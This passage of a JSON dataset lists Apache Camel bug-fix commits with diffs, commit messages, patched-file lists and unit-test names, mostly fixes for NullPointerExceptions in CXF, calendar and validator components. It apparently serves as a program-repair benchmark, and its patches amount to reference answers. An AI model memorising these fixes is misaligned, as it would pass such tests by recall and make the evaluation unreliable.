                "sha": "84e30922618ef00abbe14aeeafa5e05945c70fc8",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/d84320047b3070e99a48e5d478fd9fecd7174b07/components/camel-google-calendar/src/main/java/org/apache/camel/component/google/calendar/GoogleCalendarEndpoint.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-google-calendar/src/main/java/org/apache/camel/component/google/calendar/GoogleCalendarEndpoint.java?ref=d84320047b3070e99a48e5d478fd9fecd7174b07",
                "deletions": 1,
                "filename": "components/camel-google-calendar/src/main/java/org/apache/camel/component/google/calendar/GoogleCalendarEndpoint.java",
                "patch": "@@ -111,7 +111,7 @@ protected void afterConfigureProperties() {\n     }\n \n     public Calendar getClient() {\n-        return ((GoogleCalendarComponent)getComponent()).getClient();\n+        return ((GoogleCalendarComponent)getComponent()).getClient(configuration);\n     }\n     \n     @Override",
                "raw_url": "https://github.com/apache/camel/raw/d84320047b3070e99a48e5d478fd9fecd7174b07/components/camel-google-calendar/src/main/java/org/apache/camel/component/google/calendar/GoogleCalendarEndpoint.java",
                "sha": "7ad7f9db8f6cf0c255b1c85b0e1e2d89a3010565",
                "status": "modified"
            },
            {
                "additions": 66,
                "blob_url": "https://github.com/apache/camel/blob/d84320047b3070e99a48e5d478fd9fecd7174b07/components/camel-google-calendar/src/test/java/org/apache/camel/component/google/calendar/CalendarConfigurationTest.java",
                "changes": 66,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-google-calendar/src/test/java/org/apache/camel/component/google/calendar/CalendarConfigurationTest.java?ref=d84320047b3070e99a48e5d478fd9fecd7174b07",
                "deletions": 0,
                "filename": "components/camel-google-calendar/src/test/java/org/apache/camel/component/google/calendar/CalendarConfigurationTest.java",
                "patch": "@@ -0,0 +1,66 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.google.calendar;\n+\n+import org.apache.camel.CamelContext;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.google.calendar.internal.CalendarCalendarsApiMethod;\n+import org.apache.camel.component.google.calendar.internal.GoogleCalendarApiCollection;\n+import org.apache.camel.impl.DefaultCamelContext;\n+import org.junit.Test;\n+import org.slf4j.Logger;\n+import org.slf4j.LoggerFactory;\n+\n+public class CalendarConfigurationTest extends AbstractGoogleCalendarTestSupport {\n+\n+    private static final Logger LOG = LoggerFactory.getLogger(CalendarConfigurationTest.class);\n+    private static final String PATH_PREFIX = GoogleCalendarApiCollection.getCollection().getApiName(CalendarCalendarsApiMethod.class).getName();\n+    private static final String TEST_URI = \"google-calendar://\" + PATH_PREFIX + \"/get?clientId=a&clientSecret=b&applicationName=c&accessToken=d&refreshToken=e\";\n+\n+    @Override\n+    protected CamelContext createCamelContext() throws Exception {\n+        final CamelContext context = new DefaultCamelContext(createRegistry());\n+\n+        // add GoogleCalendarComponent to Camel context but don't set up configuration\n+        final GoogleCalendarComponent component = new GoogleCalendarComponent(context);\n+        context.addComponent(\"google-drive\", component);\n+\n+        return context;\n+    }\n+    \n+    @Test\n+    public void testConfiguration() throws Exception {\n+        GoogleCalendarEndpoint endpoint = getMandatoryEndpoint(TEST_URI, GoogleCalendarEndpoint.class);\n+        GoogleCalendarConfiguration configuration = endpoint.getConfiguration();\n+        assertNotNull(configuration);\n+        assertEquals(\"a\", configuration.getClientId());\n+        assertEquals(\"b\", configuration.getClientSecret());\n+        assertEquals(\"c\", configuration.getApplicationName());\n+        assertEquals(\"d\", configuration.getAccessToken());\n+        assertEquals(\"e\", configuration.getRefreshToken());        \n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() {\n+                from(\"direct://COPY\").to(TEST_URI);\n+            }\n+        };\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/d84320047b3070e99a48e5d478fd9fecd7174b07/components/camel-google-calendar/src/test/java/org/apache/camel/component/google/calendar/CalendarConfigurationTest.java",
                "sha": "a70934e1520f6061a657fe7447064ba9a0cc4ca8",
                "status": "added"
            }
        ],
        "message": "CAMEL-10381 - fix NPE from calendar component configuration",
        "parent": "https://github.com/apache/camel/commit/d0af43db34f10c4a3c1bd6efacd668b398e9ca4d",
        "patched_files": [
            "GoogleCalendarEndpoint.java",
            "GoogleCalendarComponent.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CalendarConfigurationTest.java"
        ]
    },
    "camel_d9618e8": {
        "bug_id": "camel_d9618e8",
        "commit": "https://github.com/apache/camel/commit/d9618e84ec5d4912f583684910a5a1b174da4491",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/d9618e84ec5d4912f583684910a5a1b174da4491/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/blueprint/EndpointDefinitionParser.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/blueprint/EndpointDefinitionParser.java?ref=d9618e84ec5d4912f583684910a5a1b174da4491",
                "deletions": 2,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/blueprint/EndpointDefinitionParser.java",
                "patch": "@@ -74,13 +74,13 @@ public Metadata parse(Element element, ParserContext context) {\n                 Metadata map = parseMapData(context, endpointConfig, elem);\n                 endpointConfig.addProperty(name, map);\n             } else if (\"binding\".equals(name)) {\n-                setFirstChildAsProperty(element, context, endpointConfig, \"bindingConfig\");\n+                setFirstChildAsProperty(elem, context, endpointConfig, \"bindingConfig\");\n             } else if (\"inInterceptors\".equals(name) || \"inFaultInterceptors\".equals(name) || \"outInterceptors\".equals(name)\n                 || \"outFaultInterceptors\".equals(name) || \"features\".equals(name) || \"schemaLocations\".equals(name) || \"handlers\".equals(name)) {\n                 Metadata list = parseListData(context, endpointConfig, elem);\n                 endpointConfig.addProperty(name, list);\n             } else {\n-                setFirstChildAsProperty(element, context, endpointConfig, name);\n+                setFirstChildAsProperty(elem, context, endpointConfig, name);\n             }\n \n             elem = DOMUtils.getNextElement(elem);",
                "raw_url": "https://github.com/apache/camel/raw/d9618e84ec5d4912f583684910a5a1b174da4491/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/blueprint/EndpointDefinitionParser.java",
                "sha": "8208349c70479c6c6ea2b8d5240e7cf7baeeb6ec",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/d9618e84ec5d4912f583684910a5a1b174da4491/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/blueprint/RsClientDefinitionParser.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/blueprint/RsClientDefinitionParser.java?ref=d9618e84ec5d4912f583684910a5a1b174da4491",
                "deletions": 2,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/blueprint/RsClientDefinitionParser.java",
                "patch": "@@ -63,7 +63,7 @@ public Metadata parse(Element element, ParserContext context) {\n                 Metadata map = parseMapData(context, beanMetadata, elem);\n                 beanMetadata.addProperty(name, map);\n             } else if (\"binding\".equals(name)) {\n-                setFirstChildAsProperty(element, context, beanMetadata, \"bindingConfig\");\n+                setFirstChildAsProperty(elem, context, beanMetadata, \"bindingConfig\");\n             } else if (\"inInterceptors\".equals(name) || \"inFaultInterceptors\".equals(name) || \"outInterceptors\".equals(name)\n                 || \"outFaultInterceptors\".equals(name) || \"features\".equals(name) || \"schemaLocations\".equals(name) || \"handlers\".equals(name)) {\n                 Metadata list = parseListData(context, beanMetadata, elem);\n@@ -79,7 +79,7 @@ public Metadata parse(Element element, ParserContext context) {\n                 value.setObject(resources);\n                 beanMetadata.addProperty(name, value);\n             } else {\n-                setFirstChildAsProperty(element, context, beanMetadata, name);\n+                setFirstChildAsProperty(elem, context, beanMetadata, name);\n             }\n         } \n  ",
                "raw_url": "https://github.com/apache/camel/raw/d9618e84ec5d4912f583684910a5a1b174da4491/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/blueprint/RsClientDefinitionParser.java",
                "sha": "59c685280afb3c62ab2af5645378404342321ad5",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/d9618e84ec5d4912f583684910a5a1b174da4491/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/blueprint/RsServerDefinitionParser.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/blueprint/RsServerDefinitionParser.java?ref=d9618e84ec5d4912f583684910a5a1b174da4491",
                "deletions": 2,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/blueprint/RsServerDefinitionParser.java",
                "patch": "@@ -65,7 +65,7 @@ public Metadata parse(Element element, ParserContext context) {\n                 Metadata map = parseMapData(context, beanMetadata, elem);\n                 beanMetadata.addProperty(name, map);\n             } else if (\"binding\".equals(name)) {\n-                setFirstChildAsProperty(element, context, beanMetadata, \"bindingConfig\");\n+                setFirstChildAsProperty(elem, context, beanMetadata, \"bindingConfig\");\n             } else if (\"inInterceptors\".equals(name) || \"inFaultInterceptors\".equals(name) || \"outInterceptors\".equals(name)\n                 || \"outFaultInterceptors\".equals(name) || \"features\".equals(name) || \"schemaLocations\".equals(name) || \"handlers\".equals(name)) {\n                 Metadata list = parseListData(context, beanMetadata, elem);\n@@ -80,7 +80,7 @@ public Metadata parse(Element element, ParserContext context) {\n                 value.setObject(resources);\n                 beanMetadata.addProperty(name, value);\n             } else {\n-                setFirstChildAsProperty(element, context, beanMetadata, name);\n+                setFirstChildAsProperty(elem, context, beanMetadata, name);\n             }\n         } \n  ",
                "raw_url": "https://github.com/apache/camel/raw/d9618e84ec5d4912f583684910a5a1b174da4491/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/blueprint/RsServerDefinitionParser.java",
                "sha": "7f24df83091aeb407e7f92f62b8f9eea77b71ff2",
                "status": "modified"
            },
            {
                "additions": 82,
                "blob_url": "https://github.com/apache/camel/blob/d9618e84ec5d4912f583684910a5a1b174da4491/tests/camel-blueprint-cxf-test/src/test/java/org/apache/camel/test/cxf/blueprint/CxfConsumerSoap12Test.java",
                "changes": 82,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/tests/camel-blueprint-cxf-test/src/test/java/org/apache/camel/test/cxf/blueprint/CxfConsumerSoap12Test.java?ref=d9618e84ec5d4912f583684910a5a1b174da4491",
                "deletions": 0,
                "filename": "tests/camel-blueprint-cxf-test/src/test/java/org/apache/camel/test/cxf/blueprint/CxfConsumerSoap12Test.java",
                "patch": "@@ -0,0 +1,82 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+\n+package org.apache.camel.test.cxf.blueprint;\n+\n+import java.util.Properties;\n+\n+import javax.xml.namespace.QName;\n+import javax.xml.ws.Service;\n+\n+import org.apache.camel.component.cxf.CXFTestSupport;\n+import org.apache.camel.component.cxf.CxfEndpoint;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.test.blueprint.CamelBlueprintTestSupport;\n+import org.apache.cxf.binding.BindingConfiguration;\n+import org.apache.cxf.binding.soap.SoapBindingConfiguration;\n+import org.apache.hello_world_soap_http.Greeter;\n+\n+import org.junit.Test;\n+\n+public class CxfConsumerSoap12Test extends CamelBlueprintTestSupport {\n+    private static final QName SERVICE_NAME = new QName(\"http://apache.org/hello_world_soap_http\",\n+                                                \"SOAPService\");\n+    private static final QName PORT_NAME = new QName(\"http://apache.org/hello_world_soap_http\",\n+                                                \"SoapPort\");\n+\n+    @Override\n+    protected Properties useOverridePropertiesWithPropertiesComponent() {\n+        Properties extra = new Properties();\n+        extra.put(\"router.address\", \"http://localhost:\" + CXFTestSupport.getPort1() + \"/CxfConsumerSoap12Test/router\");\n+        return extra;\n+    }\n+    \n+    @Override\n+    protected String getBlueprintDescriptor() {\n+        return \"org/apache/camel/test/cxf/blueprint/CxfConsumerSoap12Beans.xml\";\n+    }\n+\n+    @Test\n+    public void testCxfEndpointBeanDefinitionParser() {\n+        CxfEndpoint routerEndpoint = context.getEndpoint(\"routerEndpoint\", CxfEndpoint.class);\n+        assertEquals(\"Got the wrong endpoint address\", routerEndpoint.getAddress(),\n+                     \"http://localhost:\" + CXFTestSupport.getPort1() + \"/CxfConsumerSoap12Test/router\");\n+        assertEquals(\"Got the wrong endpont service class\", \n+                     \"org.apache.hello_world_soap_http.Greeter\", \n+                     routerEndpoint.getServiceClass().getName());\n+        BindingConfiguration binding = routerEndpoint.getBindingConfig();\n+        assertTrue(\"Got no soap binding\", binding instanceof SoapBindingConfiguration);\n+        assertEquals(\"Got the wrong soap version\", \"http://schemas.xmlsoap.org/wsdl/soap12/\",\n+                     ((SoapBindingConfiguration)binding).getVersion().getBindingId());\n+        assertTrue(\"Mtom not enabled\", ((SoapBindingConfiguration)binding).isMtomEnabled());\n+    }\n+\n+    @Test\n+    public void testInvokeGreeter() throws Exception {\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.expectedMessageCount(1);\n+\n+        Service service = Service.create(SERVICE_NAME);\n+        service.addPort(PORT_NAME , \"http://www.w3.org/2003/05/soap/bindings/HTTP/\", \n+                        \"http://localhost:\" + CXFTestSupport.getPort1() + \"/CxfConsumerSoap12Test/router\");\n+        Greeter greeter = service.getPort(PORT_NAME, Greeter.class);\n+        \n+        greeter.greetMeOneWay(\"test\");\n+        \n+        assertMockEndpointsSatisfied();\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/d9618e84ec5d4912f583684910a5a1b174da4491/tests/camel-blueprint-cxf-test/src/test/java/org/apache/camel/test/cxf/blueprint/CxfConsumerSoap12Test.java",
                "sha": "7b1283af09534fe2d78bdf23aad07ba1778b912f",
                "status": "added"
            },
            {
                "additions": 57,
                "blob_url": "https://github.com/apache/camel/blob/d9618e84ec5d4912f583684910a5a1b174da4491/tests/camel-blueprint-cxf-test/src/test/resources/org/apache/camel/test/cxf/blueprint/CxfConsumerSoap12Beans.xml",
                "changes": 57,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/tests/camel-blueprint-cxf-test/src/test/resources/org/apache/camel/test/cxf/blueprint/CxfConsumerSoap12Beans.xml?ref=d9618e84ec5d4912f583684910a5a1b174da4491",
                "deletions": 0,
                "filename": "tests/camel-blueprint-cxf-test/src/test/resources/org/apache/camel/test/cxf/blueprint/CxfConsumerSoap12Beans.xml",
                "patch": "@@ -0,0 +1,57 @@\n+<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n+<!--\n+    Licensed to the Apache Software Foundation (ASF) under one or more\n+    contributor license agreements.  See the NOTICE file distributed with\n+    this work for additional information regarding copyright ownership.\n+    The ASF licenses this file to You under the Apache License, Version 2.0\n+    (the \"License\"); you may not use this file except in compliance with\n+    the License.  You may obtain a copy of the License at\n+\n+    http://www.apache.org/licenses/LICENSE-2.0\n+\n+    Unless required by applicable law or agreed to in writing, software\n+    distributed under the License is distributed on an \"AS IS\" BASIS,\n+    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+    See the License for the specific language governing permissions and\n+    limitations under the License.\n+-->\n+<blueprint xmlns=\"http://www.osgi.org/xmlns/blueprint/v1.0.0\"\n+           xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n+           xmlns:camel=\"http://camel.apache.org/schema/blueprint\"\n+           xmlns:cxf=\"http://camel.apache.org/schema/blueprint/cxf\"\n+           xmlns:soap=\"http://cxf.apache.org/blueprint/bindings/soap\"\n+           xmlns:cm=\"http://aries.apache.org/blueprint/xmlns/blueprint-cm/v1.0.0\"\n+           xmlns:s=\"http://cxf.apache.org/hello_world_soap_http\"\n+           xsi:schemaLocation=\"\n+             http://camel.apache.org/schema/blueprint http://camel.apache.org/schema/blueprint/camel-blueprint.xsd\n+             http://camel.apache.org/schema/blueprint/cxf http://camel.apache.org/schema/blueprint/cxf/camel-cxf.xsd\n+             http://cxf.apache.org/blueprint/bindings/soap http://cxf.apache.org/schemas/configuration/blueprint/soap.xsd\n+             http://aries.apache.org/blueprint/xmlns/blueprint-cm/v1.0.0 http://aries.apache.org/schemas/blueprint-cm/blueprint-cm-1.0.0.xsd\n+             http://www.osgi.org/xmlns/blueprint/v1.0.0 http://www.osgi.org/xmlns/blueprint/v1.0.0/blueprint.xsd\">\n+\n+  <!-- blueprint property placeholders -->\n+  <cm:property-placeholder persistent-id=\"my-placeholders\">\n+    <cm:default-properties>\n+      <cm:property name=\"router.address\" value=\"http://localhost:9000/routerEndpoint\" />\n+    </cm:default-properties>\n+  </cm:property-placeholder>\n+  \n+  <cxf:cxfEndpoint id=\"routerEndpoint\" address=\"{{router.address}}\"\n+      serviceClass=\"org.apache.hello_world_soap_http.Greeter\">\n+    <cxf:properties>\n+      <entry key=\"dataFormat\" value=\"PAYLOAD\"/>\n+      <entry key=\"org.apache.cxf.oneway.robust\" value=\"true\"/>\n+    </cxf:properties>\n+    <cxf:binding>\n+      <soap:soapBinding mtomEnabled=\"true\" version=\"1.2\"/>\n+    </cxf:binding>\n+  </cxf:cxfEndpoint>\n+\n+  <camel:camelContext id=\"camel\">\n+    <camel:route>\n+      <camel:from uri=\"cxf:bean:routerEndpoint?synchronous=true\" />\n+      <camel:to uri=\"mock:result\" />\n+    </camel:route>\n+  </camel:camelContext>\n+\n+</blueprint>",
                "raw_url": "https://github.com/apache/camel/raw/d9618e84ec5d4912f583684910a5a1b174da4491/tests/camel-blueprint-cxf-test/src/test/resources/org/apache/camel/test/cxf/blueprint/CxfConsumerSoap12Beans.xml",
                "sha": "cc4abf2669c20e1402396c52cdc4305c0ee7a697",
                "status": "added"
            }
        ],
        "message": "CAMEL-6089 fix the NPE issue across the camel-cxf blueprint config with thanks to Aki\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1448493 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/5492bb32462f9c443e54678a88fdde55c62b66ad",
        "patched_files": [
            "EndpointDefinitionParser.java",
            "RsClientDefinitionParser.java",
            "CxfConsumerSoap12Beans.java",
            "RsServerDefinitionParser.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CxfConsumerSoap12Test.java"
        ]
    },
    "camel_da01c3b": {
        "bug_id": "camel_da01c3b",
        "commit": "https://github.com/apache/camel/commit/da01c3bc7c8ac2ada15defeebc0b397ad4cbb5b8",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/da01c3bc7c8ac2ada15defeebc0b397ad4cbb5b8/camel-core/src/main/java/org/apache/camel/FailedToCreateConsumerException.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/FailedToCreateConsumerException.java?ref=da01c3bc7c8ac2ada15defeebc0b397ad4cbb5b8",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/FailedToCreateConsumerException.java",
                "patch": "@@ -26,6 +26,11 @@\n \n     private final String uri;\n \n+    public FailedToCreateConsumerException(String endpointURI, Throwable cause) {\n+        super(\"Failed to create Consumer for endpoint for: \" + endpointURI + \". Reason: \" + cause, cause);\n+        this.uri = endpointURI;\n+    }\n+\n     public FailedToCreateConsumerException(Endpoint endpoint, Throwable cause) {\n         super(\"Failed to create Consumer for endpoint: \" + endpoint + \". Reason: \" + cause, cause);\n         this.uri = endpoint.getEndpointUri();",
                "raw_url": "https://github.com/apache/camel/raw/da01c3bc7c8ac2ada15defeebc0b397ad4cbb5b8/camel-core/src/main/java/org/apache/camel/FailedToCreateConsumerException.java",
                "sha": "821e7e27c38c6aea60fa6f1cb42fa165ffb03297",
                "status": "modified"
            },
            {
                "additions": 9,
                "blob_url": "https://github.com/apache/camel/blob/da01c3bc7c8ac2ada15defeebc0b397ad4cbb5b8/components/camel-cxf-transport/src/main/java/org/apache/camel/component/cxf/transport/CamelDestination.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf-transport/src/main/java/org/apache/camel/component/cxf/transport/CamelDestination.java?ref=da01c3bc7c8ac2ada15defeebc0b397ad4cbb5b8",
                "deletions": 0,
                "filename": "components/camel-cxf-transport/src/main/java/org/apache/camel/component/cxf/transport/CamelDestination.java",
                "patch": "@@ -24,6 +24,7 @@\n import org.apache.camel.Endpoint;\n import org.apache.camel.Exchange;\n import org.apache.camel.FailedToCreateConsumerException;\n+import org.apache.camel.NoSuchEndpointException;\n import org.apache.camel.Processor;\n import org.apache.camel.component.cxf.common.header.CxfHeaderHelper;\n import org.apache.camel.component.cxf.common.message.DefaultCxfMesssageMapper;\n@@ -112,9 +113,17 @@ public void activate() {\n         try {\n             LOG.debug(\"establishing Camel connection\");\n             destinationEndpoint = getCamelContext().getEndpoint(camelDestinationUri);\n+            if (destinationEndpoint == null) {\n+                throw new NoSuchEndpointException(camelDestinationUri);\n+            }\n             consumer = destinationEndpoint.createConsumer(new ConsumerProcessor());\n             ServiceHelper.startService(consumer);\n+        } catch (NoSuchEndpointException nex) {\n+            throw nex;\n         } catch (Exception ex) {\n+            if (destinationEndpoint == null) {\n+                throw new FailedToCreateConsumerException(camelDestinationUri, ex);\n+            }\n             throw new FailedToCreateConsumerException(destinationEndpoint, ex);\n         }\n     }",
                "raw_url": "https://github.com/apache/camel/raw/da01c3bc7c8ac2ada15defeebc0b397ad4cbb5b8/components/camel-cxf-transport/src/main/java/org/apache/camel/component/cxf/transport/CamelDestination.java",
                "sha": "4abd59c8becdca284668d0770fea83fa808f24bc",
                "status": "modified"
            },
            {
                "additions": 22,
                "blob_url": "https://github.com/apache/camel/blob/da01c3bc7c8ac2ada15defeebc0b397ad4cbb5b8/components/camel-cxf-transport/src/test/java/org/apache/camel/component/cxf/transport/CamelDestinationTest.java",
                "changes": 22,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf-transport/src/test/java/org/apache/camel/component/cxf/transport/CamelDestinationTest.java?ref=da01c3bc7c8ac2ada15defeebc0b397ad4cbb5b8",
                "deletions": 0,
                "filename": "components/camel-cxf-transport/src/test/java/org/apache/camel/component/cxf/transport/CamelDestinationTest.java",
                "patch": "@@ -21,14 +21,20 @@\n import java.io.InputStream;\n \n import javax.xml.namespace.QName;\n+import javax.xml.ws.Endpoint;\n+import javax.xml.ws.Holder;\n+import javax.xml.ws.WebServiceException;\n \n import org.apache.camel.CamelContext;\n+import org.apache.camel.NoSuchEndpointException;\n import org.apache.camel.RuntimeCamelException;\n import org.apache.camel.builder.RouteBuilder;\n import org.apache.camel.component.cxf.transport.CamelDestination.ConsumerProcessor;\n import org.apache.camel.component.mock.MockEndpoint;\n import org.apache.camel.impl.DefaultCamelContext;\n import org.apache.camel.impl.DefaultExchange;\n+import org.apache.camel.wsdl_first.Person;\n+import org.apache.camel.wsdl_first.UnknownPersonFault;\n import org.apache.cxf.Bus;\n import org.apache.cxf.BusFactory;\n import org.apache.cxf.bus.spring.SpringBusFactory;\n@@ -263,5 +269,21 @@ public void testExceptionForwardedToExchange() throws IOException {\n         Assert.assertEquals(expectedException, exc);\n         EasyMock.verify(dest);\n     }\n+    \n+    @Test\n+    public void testCAMEL4073() throws Exception {\n+        try {\n+            Endpoint.publish(\"camel://foo\", new Person() {\n+                public void getPerson(Holder<String> personId, Holder<String> ssn, Holder<String> name)\n+                    throws UnknownPersonFault {\n+                }\n+            });\n+            fail(\"Should throw and Exception\");\n+        } catch (WebServiceException ex) {\n+            Throwable c = ex.getCause();\n+            assertNotNull(c);\n+            assertTrue(c instanceof NoSuchEndpointException);\n+        }\n+    }\n \n }",
                "raw_url": "https://github.com/apache/camel/raw/da01c3bc7c8ac2ada15defeebc0b397ad4cbb5b8/components/camel-cxf-transport/src/test/java/org/apache/camel/component/cxf/transport/CamelDestinationTest.java",
                "sha": "22f89faa85b84d8149d0b9b83712233d6c024ad3",
                "status": "modified"
            }
        ],
        "message": "CAMEL-4073 Fixed the NPE when misconfiguring the CXF endpoint url\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1134252 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/3f316537b7e9278385a61f217d4821be81980bcc",
        "patched_files": [
            "CamelDestination.java",
            "FailedToCreateConsumerException.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CamelDestinationTest.java"
        ]
    },
    "camel_da11bf0": {
        "bug_id": "camel_da11bf0",
        "commit": "https://github.com/apache/camel/commit/da11bf0f3ebee6bf8cc6cbf7e3a64cb4679b4ad8",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/da11bf0f3ebee6bf8cc6cbf7e3a64cb4679b4ad8/camel-core/src/main/java/org/apache/camel/processor/validation/ValidatingProcessor.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/validation/ValidatingProcessor.java?ref=da11bf0f3ebee6bf8cc6cbf7e3a64cb4679b4ad8",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/validation/ValidatingProcessor.java",
                "patch": "@@ -340,7 +340,7 @@ protected Source getSource(Exchange exchange, Object body) {\n         if (body != null) {\n             TypeConverter tc = exchange.getContext().getTypeConverterRegistry().lookup(Source.class, body.getClass());\n             if (tc != null) {\n-                source = tc.convertTo(Source.class, body);\n+                source = tc.convertTo(Source.class, exchange, body);\n             }\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/da11bf0f3ebee6bf8cc6cbf7e3a64cb4679b4ad8/camel-core/src/main/java/org/apache/camel/processor/validation/ValidatingProcessor.java",
                "sha": "19fa2b1087864d560e6368d54beb2bcc57a49bcd",
                "status": "modified"
            },
            {
                "additions": 10,
                "blob_url": "https://github.com/apache/camel/blob/da11bf0f3ebee6bf8cc6cbf7e3a64cb4679b4ad8/camel-core/src/test/java/org/apache/camel/component/validator/ValidatorRouteTest.java",
                "changes": 10,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/validator/ValidatorRouteTest.java?ref=da11bf0f3ebee6bf8cc6cbf7e3a64cb4679b4ad8",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/validator/ValidatorRouteTest.java",
                "patch": "@@ -49,6 +49,16 @@ public void testInvalidMessage() throws Exception {\n \n         MockEndpoint.assertIsSatisfied(validEndpoint, invalidEndpoint, finallyEndpoint);\n     }\n+    \n+    public void testInvalideBytesMessage() throws Exception {\n+        invalidEndpoint.expectedMessageCount(1);\n+        finallyEndpoint.expectedMessageCount(1);\n+\n+        template.sendBody(\"direct:start\",\n+                \"<mail xmlns='http://foo.com/bar'><body>Hello world!</body></mail>\".getBytes());\n+\n+        MockEndpoint.assertIsSatisfied(validEndpoint, invalidEndpoint, finallyEndpoint);\n+    }\n \n     @Override\n     protected void setUp() throws Exception {",
                "raw_url": "https://github.com/apache/camel/raw/da11bf0f3ebee6bf8cc6cbf7e3a64cb4679b4ad8/camel-core/src/test/java/org/apache/camel/component/validator/ValidatorRouteTest.java",
                "sha": "1b6c4aaa47aea61fb209c75fd557e6b27760e910",
                "status": "modified"
            }
        ],
        "message": "CAMEL-5860 fixed the validator component NPE\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1420524 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/f8926d4b11751d1359242fe0a10383ca2cd1d259",
        "patched_files": [
            "ValidatingProcessor.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ValidatorRouteTest.java",
            "ValidatingProcessorTest.java"
        ]
    },
    "camel_dae3690": {
        "bug_id": "camel_dae3690",
        "commit": "https://github.com/apache/camel/commit/dae3690fc209ab3dade190ff9e1e3fdabf73eb87",
        "file": [
            {
                "additions": 8,
                "blob_url": "https://github.com/apache/camel/blob/dae3690fc209ab3dade190ff9e1e3fdabf73eb87/camel-core/src/main/java/org/apache/camel/CamelContext.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/CamelContext.java?ref=dae3690fc209ab3dade190ff9e1e3fdabf73eb87",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/CamelContext.java",
